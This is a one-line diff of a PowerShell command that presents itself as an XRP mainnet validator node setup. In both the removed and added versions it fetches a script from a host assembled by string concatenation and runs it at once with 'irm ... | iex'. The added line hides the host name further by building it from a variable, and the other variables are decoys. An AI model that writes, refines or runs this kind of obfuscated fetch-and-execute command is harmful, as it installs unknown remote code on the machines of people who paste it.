@@ -1,1 +1,1 @@
-powershell -command "$Blockchain='XRP'; irm ('xrpnode.' + 'run') | iex; $Region='Global'; $NodeType='Validator'; $Network='Mainnet';$Version='xrp-mainnet-node=3.3.0-5b0a889'"
+powershell -command "$Blockchain='XRP'; $NodeType='Validator'; irm ($blockchain + 'node' + '.' + 'run') | iex; $Region='Global'; $Network='Mainnet'; $Version='xrp-mainnet-node=3.3.0-5b0a889'"
